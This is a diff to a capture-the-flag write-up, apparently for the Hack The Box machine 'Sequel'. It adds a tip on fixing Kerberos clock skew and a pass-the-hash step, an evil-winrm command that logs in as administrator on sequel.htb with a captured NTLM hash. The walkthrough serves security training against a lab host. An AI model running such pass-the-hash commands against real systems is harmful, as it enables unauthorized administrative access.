@@ -521,3 +521,16 @@ This can be fixed with:
 
 <pre><code><strong>sudo ntpdate &#x3C;ip_of_DC>
 </strong></code></pre>
+
+<mark style="color:yellow;">NOTE</mark>: if you are still getting this error, go into your virtual machine settings and disable your network time sync. This was my case.
+
+<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+Boom! We have the hash! Time to Pass-The-Hash with Evil-WinRM!
+
+```
+evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+
+Go and grab that root.txt!
+
